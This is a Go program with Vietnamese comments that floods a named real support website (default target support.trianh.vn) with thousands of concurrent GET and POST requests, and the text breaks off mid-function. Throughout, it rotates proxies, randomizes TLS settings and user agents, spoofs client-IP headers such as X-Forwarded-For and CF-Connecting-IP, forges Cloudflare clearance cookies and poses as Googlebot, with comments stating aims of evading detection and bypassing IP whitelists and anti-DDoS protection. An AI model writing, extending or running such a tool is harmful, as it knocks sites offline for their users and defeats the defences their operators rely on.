package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"fmt"
	"math"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// Cấu trúc để lưu thống kê
type Stats struct {
	totalRequests    int64
	successCount     int64
	errorCount       int64
	totalDuration    int64
	proxyUsedCount   int64
	directUsedCount  int64
	activeGoroutines int32 // Số lượng goroutine đang hoạt động
	maxGoroutines    int32 // Số lượng goroutine tối đa đã đạt được
}

// Cấu trúc để lưu thông tin proxy
type Proxy struct {
	IP       string
	Port     string
	Username string
	Password string
	Failures int32      // Số lần kết nối thất bại liên tiếp
	LastUsed time.Time  // Thời gian sử dụng gần nhất
	Banned   bool       // Đánh dấu proxy bị cấm tạm thời
	BanUntil time.Time  // Thời gian hết hạn cấm
	Country  string     // Quốc gia của proxy
	mutex    sync.Mutex // Mutex để đồng bộ truy cập
}

// Cấu trúc để lưu cấu hình
type Config struct {
	TargetServer       string
	TargetPort         string
	Protocol           string
	Endpoints          []string
	MaxConcurrent      int
	DelayMs            int
	PreferredCountries []string // Danh sách quốc gia ưu tiên cho proxy
}

// Đánh dấu proxy thất bại
func (p *Proxy) markFailure() bool {
	p.mutex.Lock()
	defer p.mutex.Unlock()

	p.Failures++
	p.LastUsed = time.Now()

	// Nếu quá nhiều lỗi, cấm tạm thời
	if p.Failures >= 5 {
		banDuration := time.Duration(math.Min(float64(p.Failures)*5, 300)) * time.Second
		p.Banned = true
		p.BanUntil = time.Now().Add(banDuration)
		fmt.Printf("⚠️ Proxy %s:%s bị tạm khóa trong %v do quá nhiều lỗi\n", p.IP, p.Port, banDuration)
		return true // Proxy đã bị cấm
	}

	return false
}

// Đánh dấu proxy thành công
func (p *Proxy) markSuccess() {
	p.mutex.Lock()
	defer p.mutex.Unlock()

	p.Failures = 0
	p.LastUsed = time.Now()
}

// Kiểm tra proxy có sẵn sàng sử dụng không
func (p *Proxy) isAvailable() bool {
	p.mutex.Lock()
	defer p.mutex.Unlock()

	// Nếu proxy bị cấm, kiểm tra thời gian hết hạn
	if p.Banned {
		if time.Now().After(p.BanUntil) {
			// Hết thời gian cấm
			p.Banned = false
			p.Failures = 0
			fmt.Printf("✅ Proxy %s:%s đã hết thời gian cấm, được phép sử dụng lại\n", p.IP, p.Port)
			return true
		}
		return false
	}

	return true
}

// Cấu trúc để quản lý proxy pool
type ProxyPool struct {
	proxies []Proxy
	mutex   sync.Mutex
}

// Khởi tạo proxy pool
func NewProxyPool(proxies []Proxy) *ProxyPool {
	return &ProxyPool{
		proxies: proxies,
	}
}

// Lấy proxy khả dụng
func (pool *ProxyPool) getAvailableProxy() (Proxy, bool) {
	pool.mutex.Lock()
	defer pool.mutex.Unlock()

	// Đếm số proxy khả dụng
	availableCount := 0
	for i := range pool.proxies {
		if pool.proxies[i].isAvailable() {
			availableCount++
		}
	}

	if availableCount == 0 {
		return Proxy{}, false
	}

	// Chọn ngẫu nhiên một proxy khả dụng
	for tries := 0; tries < 3; tries++ { // Thử tối đa 3 lần
		idx := rand.Intn(len(pool.proxies))
		if pool.proxies[idx].isAvailable() {
			return pool.proxies[idx], true
		}
	}

	// Nếu chọn ngẫu nhiên không được, quét tuần tự
	for i := range pool.proxies {
		if pool.proxies[i].isAvailable() {
			return pool.proxies[i], true
		}
	}

	return Proxy{}, false
}

// Lấy proxy khả dụng từ một quốc gia cụ thể
func (pool *ProxyPool) getAvailableProxyFromCountry(country string) (Proxy, bool) {
	pool.mutex.Lock()
	defer pool.mutex.Unlock()

	// Đếm số proxy khả dụng từ quốc gia chỉ định
	var availableProxies []int
	for i := range pool.proxies {
		if pool.proxies[i].isAvailable() &&
			(country == "" || pool.proxies[i].Country == country) {
			availableProxies = append(availableProxies, i)
		}
	}

	if len(availableProxies) == 0 {
		return Proxy{}, false
	}

	// Chọn ngẫu nhiên một proxy từ danh sách khả dụng
	idx := availableProxies[rand.Intn(len(availableProxies))]
	return pool.proxies[idx], true
}

// Lấy proxy khả dụng với ưu tiên quốc gia
func (pool *ProxyPool) getAvailableProxyWithCountryPreference(preferredCountries []string) (Proxy, bool) {
	// Ưu tiên chọn proxy từ Việt Nam nếu có thể
	vietnameseProxy, found := pool.getAvailableProxyFromCountry("VN")
	if found {
		fmt.Println("✅ Đã tìm thấy proxy từ Việt Nam, ưu tiên sử dụng")
		return vietnameseProxy, true
	}

	// Thử từng quốc gia ưu tiên
	for _, country := range preferredCountries {
		proxy, found := pool.getAvailableProxyFromCountry(country)
		if found {
			return proxy, true
		}
	}

	// Nếu không tìm thấy proxy từ các quốc gia ưu tiên, lấy bất kỳ proxy khả dụng nào
	return pool.getAvailableProxy()
}

// Báo cáo proxy thất bại
func (pool *ProxyPool) reportFailure(failedProxy Proxy) {
	pool.mutex.Lock()
	defer pool.mutex.Unlock()

	for i := range pool.proxies {
		if pool.proxies[i].IP == failedProxy.IP && pool.proxies[i].Port == failedProxy.Port {
			banned := pool.proxies[i].markFailure()
			if banned {
				fmt.Printf("⚠️ Proxy %s:%s đã bị đưa vào blacklist tạm thời\n", failedProxy.IP, failedProxy.Port)
			}
			return
		}
	}
}

// Báo cáo proxy thành công
func (pool *ProxyPool) reportSuccess(successProxy Proxy) {
	pool.mutex.Lock()
	defer pool.mutex.Unlock()

	for i := range pool.proxies {
		if pool.proxies[i].IP == successProxy.IP && pool.proxies[i].Port == successProxy.Port {
			pool.proxies[i].markSuccess()
			return
		}
	}
}

// Đọc cấu hình từ file config.txt
func loadConfig(filename string) (*Config, error) {
	config := &Config{
		TargetServer:       "support.trianh.vn", // Mặc định
		TargetPort:         "443",
		Protocol:           "https",
		Endpoints:          []string{"/feedback/index", "/task/index"},
		MaxConcurrent:      2000,                                                                 // Tăng độ đa luồng lên 2000 mặc định
		DelayMs:            5,                                                                    // Giảm delay mặc định
		PreferredCountries: []string{"US", "CA", "GB", "SG", "JP", "KR", "DE", "FR", "NL", "AU"}, // Quốc gia ưu tiên mặc định
	}

	file, err := os.Open(filename)
	if err != nil {
		// Nếu không có file config, dùng giá trị mặc định
		return config, nil
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}

		parts := strings.SplitN(line, "=", 2)
		if len(parts) != 2 {
			continue
		}

		key := strings.TrimSpace(parts[0])
		value := strings.TrimSpace(parts[1])

		switch key {
		case "TARGET_SERVER":
			config.TargetServer = value
		case "TARGET_PORT":
			config.TargetPort = value
		case "PROTOCOL":
			config.Protocol = value
		case "ENDPOINTS":
			config.Endpoints = append(config.Endpoints, value)
		case "MAX_CONCURRENT":
			if val, err := strconv.Atoi(value); err == nil {
				config.MaxConcurrent = val
			}
		case "DELAY_MS":
			if val, err := strconv.Atoi(value); err == nil {
				config.DelayMs = val
			}
		case "PREFERRED_COUNTRIES":
			// Format: US,CA,GB,SG,...
			countries := strings.Split(value, ",")
			for i, country := range countries {
				countries[i] = strings.TrimSpace(country)
			}
			if len(countries) > 0 {
				config.PreferredCountries = countries
			}
		}
	}

	return config, scanner.Err()
}

// Đọc danh sách proxy từ file
func loadProxies(filename string) (*ProxyPool, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var proxies []Proxy
	scanner := bufio.NewScanner(file)

	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" {
			continue
		}

		// Format: IP:PORT:USERNAME:PASSWORD[:COUNTRY]
		parts := strings.Split(line, ":")
		if len(parts) >= 4 {
			country := "UNKNOWN"
			if len(parts) >= 5 {
				country = strings.ToUpper(parts[4])
			} else {
				// Nếu không có thông tin quốc gia, thử đoán từ IP
				// Ví dụ: Một số dải IP Việt Nam phổ biến
				ip := parts[0]
				if strings.HasPrefix(ip, "14.") ||
					strings.HasPrefix(ip, "27.") ||
					strings.HasPrefix(ip, "42.") ||
					strings.HasPrefix(ip, "58.") ||
					strings.HasPrefix(ip, "113.") ||
					strings.HasPrefix(ip, "115.") ||
					strings.HasPrefix(ip, "117.") ||
					strings.HasPrefix(ip, "125.") ||
					strings.HasPrefix(ip, "171.") ||
					strings.HasPrefix(ip, "183.") ||
					strings.HasPrefix(ip, "203.") {
					country = "VN"
				}
			}

			proxy := Proxy{
				IP:       parts[0],
				Port:     parts[1],
				Username: parts[2],
				Password: parts[3],
				Country:  country,
				LastUsed: time.Now().Add(-24 * time.Hour), // Đặt thời gian sử dụng gần nhất là 24h trước
			}

			proxies = append(proxies, proxy)
		}
	}

	return NewProxyPool(proxies), scanner.Err()
}

// Tạo HTTP client với proxy
func createProxyClient(proxy Proxy) (*http.Client, error) {
	proxyURL, err := url.Parse(fmt.Sprintf("http://%s:%s@%s:%s",
		proxy.Username, proxy.Password, proxy.IP, proxy.Port))
	if err != nil {
		return nil, err
	}

	// Thêm nhiều cấu hình TLS khác nhau để tránh bị phát hiện theo fingerprint
	tlsConfig := &tls.Config{
		InsecureSkipVerify: true,
		MinVersion:         tls.VersionTLS12,
		MaxVersion:         tls.VersionTLS13,
		CipherSuites: []uint16{
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,
			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
		},
	}

	transport := &http.Transport{
		Proxy:                 http.ProxyURL(proxyURL),
		MaxIdleConns:          5000,            // Giảm connection pool để tiết kiệm port
		MaxIdleConnsPerHost:   500,             // Giảm connections per host
		IdleConnTimeout:       5 * time.Second, // Giảm thời gian giữ kết nối để giải phóng port nhanh hơn
		DisableKeepAlives:     false,           // Giữ keep-alive để tái sử dụng kết nối
		TLSClientConfig:       tlsConfig,       // Cấu hình TLS được tùy chỉnh
		DisableCompression:    true,            // Tắt compression để tăng tốc
		MaxConnsPerHost:       500,             // Giảm max connections để tránh port exhaustion
		ResponseHeaderTimeout: 8 * time.Second, // Giảm timeout
		ExpectContinueTimeout: 2 * time.Second, // Giảm expect timeout
		// Vẫn giữ header proxy nhưng không còn bắt buộc
		ProxyConnectHeader: map[string][]string{
			"User-Agent": {"Go-http-client/1.1"},
		},
	}

	client := &http.Client{
		Transport: transport,
		Timeout:   10 * time.Second, // Giảm timeout để giải phóng kết nối nhanh hơn
	}

	return client, nil
}

// Tạo HTTP client kết nối trực tiếp (không qua proxy)
func createDirectClient() *http.Client {
	// Danh sách cipher suites phổ biến để tránh dấu vân tay TLS
	cipherSuites := []uint16{
		tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
		tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
		tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
		tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
		tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,
		tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
	}

	// Tạo TLS config với các cấu hình khác nhau để tránh fingerprinting
	tlsConfig := &tls.Config{
		InsecureSkipVerify: true,
		MinVersion:         tls.VersionTLS12,
		MaxVersion:         tls.VersionTLS13,
		CipherSuites:       cipherSuites,
		// Thêm randomized Client Hello để tránh TLS fingerprinting
		PreferServerCipherSuites: rand.Intn(2) == 0,
	}

	// Sử dụng giá trị ngẫu nhiên cho các timeout để tránh bị phát hiện
	var (
		idleConnTimeout = time.Duration(rand.Intn(5)+3) * time.Second
		tlsTimeout      = time.Duration(rand.Intn(10)+25) * time.Second
		expectTimeout   = time.Duration(rand.Intn(5)+7) * time.Second
		clientTimeout   = time.Duration(rand.Intn(10)+25) * time.Second
	)

	transport := &http.Transport{
		MaxIdleConns:          5000,
		MaxIdleConnsPerHost:   500,
		IdleConnTimeout:       idleConnTimeout,
		DisableKeepAlives:     rand.Intn(10) == 0, // 10% cơ hội tắt keep-alive
		TLSClientConfig:       tlsConfig,
		DisableCompression:    true,
		MaxConnsPerHost:       500,
		ResponseHeaderTimeout: tlsTimeout,
		ExpectContinueTimeout: expectTimeout,
		// Thêm vài header proxy giả để tránh bị chặn
		ProxyConnectHeader: map[string][]string{
			"User-Agent": {"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"},
		},
		// Sử dụng các tùy chọn để tránh bị phát hiện
		ForceAttemptHTTP2:   rand.Intn(2) == 0,
		TLSHandshakeTimeout: tlsTimeout,
	}

	client := &http.Client{
		Transport: transport,
		Timeout:   clientTimeout,
		// Thêm CheckRedirect để xử lý redirect một cách ngẫu nhiên (tránh bị phát hiện)
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			// Giới hạn số lần redirect
			if len(via) >= 10 {
				return fmt.Errorf("quá nhiều redirect")
			}

			// Thêm User-Agent mới cho request được redirect
			if rand.Intn(2) == 0 {
				userAgents := []string{
					"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
					"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
					"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
				}
				req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
			}

			return nil
		},
	}

	return client
}

func sendHTTPRequest(endpoint string, clientID int, stats *Stats, wg *sync.WaitGroup, proxyPool *ProxyPool) {
	defer wg.Done()

	start := time.Now()
	atomic.AddInt64(&stats.totalRequests, 1)

	// Sử dụng proxy trước, nếu có lỗi thì thử kết nối trực tiếp
	useDirectConnection := false

	// Nếu không có proxy hoặc random chọn kết nối trực tiếp (10% trường hợp thay vì 20%)
	if proxyPool == nil || len(proxyPool.proxies) == 0 || rand.Intn(10) == 0 {
		useDirectConnection = true
	}

	// Thử với proxy trước (nếu có và được chọn)
	if !useDirectConnection && proxyPool != nil && len(proxyPool.proxies) > 0 {
		// Danh sách quốc gia ưu tiên - ưu tiên Việt Nam và các nước Đông Nam Á
		preferredCountries := []string{"VN", "SG", "TH", "MY", "ID", "PH", "JP", "KR", "US", "CA", "GB"}

		// Retry với 3 proxy khác nhau nếu timeout
		maxProxyRetries := 3
		for retry := 0; retry < maxProxyRetries; retry++ {
			// Lấy proxy khả dụng từ pool với ưu tiên quốc gia
			proxy, found := proxyPool.getAvailableProxyWithCountryPreference(preferredCountries)
			if !found {
				fmt.Printf("Client %d: KHÔNG CÓ PROXY KHẢ DỤNG - THỬ KẾT NỐI TRỰC TIẾP\n", clientID)
				useDirectConnection = true
				break
			}

			// Hiển thị thông tin quốc gia nếu có
			if proxy.Country != "" && proxy.Country != "UNKNOWN" {
				fmt.Printf("Client %d đang sử dụng proxy: %s:%s (%s)\n", clientID, proxy.IP, proxy.Port, proxy.Country)
			} else {
				fmt.Printf("Client %d đang sử dụng proxy: %s:%s\n", clientID, proxy.IP, proxy.Port)
			}

			client, err := createProxyClient(proxy)
			if err != nil {
				fmt.Printf("Client %d lỗi tạo proxy %s:%s: %v\n", clientID, proxy.IP, proxy.Port, err)
				proxyPool.reportFailure(proxy)
				if retry == maxProxyRetries-1 {
					fmt.Printf("Client %d: TẤT CẢ PROXY ĐỀU THẤT BẠI - THỬ KẾT NỐI TRỰC TIẾP\n", clientID)
					useDirectConnection = true
					break
				}
				continue
			}
			atomic.AddInt64(&stats.proxyUsedCount, 1)

			// Thực hiện request với proxy
			success := sendRequestWithClient(client, endpoint, clientID, stats, start, proxy, proxyPool)
			if success {
				return // Thành công, thoát khỏi function
			}

			// Tăng thời gian chờ theo hàm mũ cho mỗi lần retry
			backoffDelay := time.Duration(50*(1<<retry)) * time.Millisecond // 50ms, 100ms, 200ms
			time.Sleep(backoffDelay)
		}
	}

	// Nếu proxy thất bại hoặc đã chọn kết nối trực tiếp
	if useDirectConnection {
		fmt.Printf("Client %d đang sử dụng kết nối trực tiếp (IP thật)\n", clientID)
		client := createDirectClient()
		atomic.AddInt64(&stats.directUsedCount, 1)

		// Thử với nhiều User-Agent và header khác nhau để bypass whitelist
		maxDirectRetries := 5 // Tăng số lần thử cho kết nối trực tiếp
		for i := 0; i < maxDirectRetries; i++ {
			if sendRequestWithClientBypassWhitelist(client, endpoint, clientID, stats, start, i) {
				return // Thành công, thoát khỏi function
			}

			// Tăng thời gian chờ theo hàm mũ cho mỗi lần retry
			backoffDelay := time.Duration(100*(1<<i)) * time.Millisecond // 100ms, 200ms, 400ms, 800ms, 1600ms

			// Thêm một chút jitter ngẫu nhiên (±20%)
			jitter := rand.Float64()*0.4 - 0.2 // -20% to +20%
			backoffWithJitter := time.Duration(float64(backoffDelay) * (1 + jitter))

			fmt.Printf("Client %d: Đợi %v trước khi thử lại lần %d\n", clientID, backoffWithJitter, i+1)
			time.Sleep(backoffWithJitter)
		}
	}

	// Nếu tất cả đều thất bại
	atomic.AddInt64(&stats.errorCount, 1)
}

// Hàm gửi request với client đã cấu hình
func sendRequestWithClient(client *http.Client, endpoint string, clientID int, stats *Stats, start time.Time, proxy Proxy, proxyPool *ProxyPool) bool {
	// Mô phỏng yêu cầu GET
	getResp, err := client.Get(endpoint)
	if err != nil {
		fmt.Printf("Lỗi khi gửi GET từ client %d: %v\n", clientID, err)
		if proxyPool != nil {
			proxyPool.reportFailure(proxy)
		}
		return false
	}
	defer getResp.Body.Close()
	fmt.Printf("Client %d (GET) nhận phản hồi: %s\n", clientID, getResp.Status)

	// Kiểm tra status code
	if getResp.StatusCode < 200 || getResp.StatusCode >= 300 {
		fmt.Printf("Client %d (GET) nhận status code không thành công: %d\n", clientID, getResp.StatusCode)
		if proxyPool != nil && getResp.StatusCode >= 400 {
			proxyPool.reportFailure(proxy)
		}
	}

	// Mô phỏng yêu cầu POST (giả lập gửi form feedback)
	postData := bytes.NewBuffer([]byte(`{"name":"TestUser","message":"Test DDoS simulation"}`))
	postReq, err := http.NewRequest("POST", endpoint, postData)
	if err != nil {
		fmt.Printf("Lỗi khi tạo POST từ client %d: %v\n", clientID, err)
		return false
	}
	postReq.Header.Set("Content-Type", "application/json")

	// Mô phỏng hành vi người dùng thật: Thay đổi User-Agent ngẫu nhiên
	userAgents := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (Android 11; Mobile; rv:89.0) Gecko/89.0 Firefox/89.0",
		"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
	}
	postReq.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])

	postResp, err := client.Do(postReq)
	if err != nil {
		fmt.Printf("Lỗi khi gửi POST từ client %d: %v\n", clientID, err)
		if proxyPool != nil {
			proxyPool.reportFailure(proxy)
		}
		return false
	}
	defer postResp.Body.Close()
	fmt.Printf("Client %d (POST) nhận phản hồi: %s\n", clientID, postResp.Status)

	// Kiểm tra status code
	if postResp.StatusCode < 200 || postResp.StatusCode >= 300 {
		fmt.Printf("Client %d (POST) nhận status code không thành công: %d\n", clientID, postResp.StatusCode)
		if proxyPool != nil && postResp.StatusCode >= 400 {
			proxyPool.reportFailure(proxy)
		}
	} else if proxyPool != nil {
		// Báo cáo proxy thành công
		proxyPool.reportSuccess(proxy)
	}

	// Cập nhật thống kê - thành công
	duration := time.Since(start)
	atomic.AddInt64(&stats.successCount, 1)
	atomic.AddInt64(&stats.totalDuration, int64(duration))

	// Độ trễ ngẫu nhiên để tránh bị phát hiện là bot
	delay := time.Duration(rand.Intn(500)+100) * time.Millisecond // Độ trễ 100-600ms
	time.Sleep(delay)

	return true
}

// Hàm gửi request với nhiều cách để bypass whitelist IP
func sendRequestWithClientBypassWhitelist(client *http.Client, endpoint string, clientID int, stats *Stats, start time.Time, attempt int) bool {
	// Danh sách User-Agent đa dạng (bao gồm cả crawler và bot hợp pháp)
	userAgents := []string{
		// Browser phổ biến ở Việt Nam
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Coc_Coc/112.0.5615.165 Chrome/106.0.5249.165 Safari/537.36", // Cốc Cốc browser phổ biến ở VN
		"Mozilla/5.0 (Linux; Android 10; SM-A505F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.210 Mobile Safari/537.36",                 // Samsung phổ biến tại VN
		"Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",                               // iOS tại VN
		// Crawler hợp pháp
		"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
		"Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
	}

	// Headers để thử bypass - ưu tiên IP Việt Nam
	xForwardedFor := []string{
		// Vietnam IPs (ưu tiên)
		"14.161.0.1",   // VNPT
		"27.72.98.1",   // VNPT
		"42.112.34.1",  // Viettel
		"58.186.12.1",  // FPT
		"113.161.80.1", // VNPT
		"115.79.34.1",  // VNPT
		"117.0.37.1",   // Viettel
		"125.234.12.1", // FPT
		"171.224.50.1", // Viettel
		"183.80.132.1", // VNPT
		"203.162.0.1",  // Vietnam IP
		"113.161.0.1",  // Vietnam IP
		"116.118.0.1",  // Vietnam IP
		"14.161.0.1",   // Vietnam IP
		"171.225.0.1",  // Vietnam IP
		"115.79.0.1",   // Vietnam IP
		"123.24.0.1",   // Vietnam IP
		"42.112.0.1",   // Vietnam IP
		"125.234.0.1",  // Vietnam IP
		// Fallback IPs
		"127.0.0.1",
		"192.168.1.1",
		"10.0.0.1",
		"172.16.0.1",
	}

	// Danh sách các host ISP để tạo giả Referer - ưu tiên website Việt Nam
	refererHosts := []string{
		// Sites phổ biến tại Việt Nam
		"vnexpress.net",
		"dantri.com.vn",
		"24h.com.vn",
		"tuoitre.vn",
		"vietnamnet.vn",
		"thanhnien.vn",
		"kenh14.vn",
		"cafef.vn",
		"genk.vn",
		"zing.vn",
		"baomoi.com",
		"voh.com.vn",
		"vietcombank.com.vn",
		"vietinbank.vn",
		"mbbank.com.vn",
		"facebook.com",
		"google.com.vn",
		"youtube.com",
		"tiktok.com",
	}

	// Danh sách các ngôn ngữ để mô phỏng người dùng Việt Nam
	acceptLanguages := []string{
		// Ưu tiên tiếng Việt
		"vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
		"vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
		"vi;q=0.9,en-US;q=0.8,en;q=0.7",
		"vi;q=1.0,en;q=0.5",
		"vi-VN;q=0.9,vi;q=0.8,en-US;q=0.7,en;q=0.6",
		// Ngôn ngữ khác
		"en-US,en;q=0.9,vi;q=0.8",
		"en-GB,en;q=0.9,vi;q=0.8",
		"fr-FR,fr;q=0.9,vi;q=0.8,en-US;q=0.7,en;q=0.6",
	}

	// Tạo request GET với headers đặc biệt để bypass
	getReq, err := http.NewRequest("GET", endpoint, nil)
	if err != nil {
		fmt.Printf("Lỗi khi tạo GET request từ client %d: %v\n", clientID, err)
		return false
	}

	// 80% chọn User-Agent của thiết bị phổ biến tại Việt Nam
	selectedUA := ""
	if rand.Intn(10) < 8 {
		// Chọn 8/10 UA phổ biến ở VN
		selectedUA = userAgents[rand.Intn(8)]
	} else {
		// Chọn bất kỳ UA nào
		selectedUA = userAgents[rand.Intn(len(userAgents))]
	}
	getReq.Header.Set("User-Agent", selectedUA)

	// 90% chọn IP của Việt Nam để giả mạo
	randomIP := ""
	if rand.Intn(10) < 9 {
		// Chọn IP Việt Nam
		randomIP = xForwardedFor[rand.Intn(20)] // 20 IP đầu tiên là IP Việt Nam
	} else {
		// Chọn bất kỳ IP nào
		randomIP = xForwardedFor[rand.Intn(len(xForwardedFor))]
	}

	// Thêm các header để bypass whitelist
	if rand.Intn(2) == 0 {
		getReq.Header.Set("X-Forwarded-For", randomIP)
	}

	if rand.Intn(2) == 0 {
		getReq.Header.Set("X-Real-IP", randomIP)
	}

	if rand.Intn(2) == 0 {
		getReq.Header.Set("X-Client-IP", randomIP)
	}

	if rand.Intn(2) == 0 {
		getReq.Header.Set("True-Client-IP", randomIP)
	}

	// 80% chọn ngôn ngữ tiếng Việt
	if rand.Intn(10) < 8 {
		// Chọn tiếng Việt (5 lựa chọn đầu tiên)
		getReq.Header.Set("Accept-Language", acceptLanguages[rand.Intn(5)])
	} else {
		// Chọn bất kỳ ngôn ngữ nào
		getReq.Header.Set("Accept-Language", acceptLanguages[rand.Intn(len(acceptLanguages))])
	}

	// CF-Connecting-IP và một số header đặc biệt khác
	if rand.Intn(3) == 0 {
		getReq.Header.Set("CF-Connecting-IP", randomIP)
	}

	if rand.Intn(3) == 0 {
		getReq.Header.Set("Fastly-Client-IP", randomIP)
	}

	// Thêm các header CDN và Cloud Provider
	if rand.Intn(3) == 0 {
		getReq.Header.Set("X-Azure-ClientIP", randomIP)
	}

	if rand.Intn(3) == 0 {
		getReq.Header.Set("X-Forwarded-By", "FPT-Cloud")
	}

	if rand.Intn(3) == 0 {
		getReq.Header.Set("X-Forwarded-By", "VNPT-NET")
	}

	// Thêm header Referer để giả vờ đến từ một trang hợp pháp
	if rand.Intn(2) == 0 {
		// 50% cơ hội sử dụng Referer từ trang đích
		getReq.Header.Set("Referer", fmt.Sprintf("https://%s/", strings.Split(getReq.URL.Host, ":")[0]))
	} else {
		// 50% cơ hội sử dụng Referer từ một trang web phổ biến
		// 80% chọn website Việt Nam
		var refHost string
		if rand.Intn(10) < 8 {
			// Chọn website Việt Nam (15 lựa chọn đầu tiên)
			refHost = refererHosts[rand.Intn(15)]
		} else {
			// Chọn bất kỳ website nào
			refHost = refererHosts[rand.Intn(len(refererHosts))]
		}
		getReq.Header.Set("Referer", fmt.Sprintf("https://%s/", refHost))
	}

	// Origin header tương tự
	if rand.Intn(2) == 0 {
		getReq.Header.Set("Origin", fmt.Sprintf("https://%s", strings.Split(getReq.URL.Host, ":")[0]))
	}

	// Cookie ngẫu nhiên để bypass một số hệ thống chống DDoS
	cookieParts := []string{
		fmt.Sprintf("session=bypass%d", rand.Intn(1000)),
		fmt.Sprintf("visited=true%d", rand.Intn(100)),
		fmt.Sprintf("_ga=GA1.2.%d.%d", rand.Int63(), rand.Int63()),
	}

	if rand.Intn(3) == 0 {
		// Thêm một số cookie CF để giả mạo đã vượt qua Cloudflare
		cookieParts = append(cookieParts, fmt.Sprintf("cf_clearance=%x%x", rand.Int63(), rand.Int63()))
	}

	// Thêm cookie ngôn ngữ tiếng Việt
	cookieParts = append(cookieParts, "lang=vi")

	// Thêm cookie vùng Việt Nam
	cookieParts = append(cookieParts, "country=VN")

	// Kết hợp cookies ngẫu nhiên
	getReq.Header.Set("Cookie", strings.Join(cookieParts, "; "))

	// Thêm Accept header như browser thật
	acceptHeaders := []string{
		"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
		"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
	}
	getReq.Header.Set("Accept", acceptHeaders[rand.Intn(len(acceptHeaders))])

	// Cache-Control và Pragma ngẫu nhiên
	if rand.Intn(2) == 0 {
		getReq.Header.Set("Cache-Control", "no-cache")
		getReq.Header.Set("Pragma", "no-cache")
	}

	// Một số header khác để tăng độ tin cậy
	if rand.Intn(2) == 0 {
		getReq.Header.Set("Sec-Fetch-Dest", "document")
		getReq.Header.Set("Sec-Fetch-Mode", "navigate")
